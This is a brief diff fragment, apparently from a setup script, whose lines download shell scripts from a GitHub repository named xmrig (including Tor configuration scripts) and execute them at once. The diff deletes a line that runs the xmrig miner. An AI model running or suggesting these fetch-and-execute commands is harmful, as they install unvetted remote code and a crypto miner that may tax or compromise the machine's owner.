@@ -15,4 +15,3 @@ wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/onion.sh && c
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/xmr.sh && chmod +x xmr.sh && ./xmr.sh
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.sh && chmod +x config.sh && ./config.sh
 
-chmod +x xmrig && ./xmrig
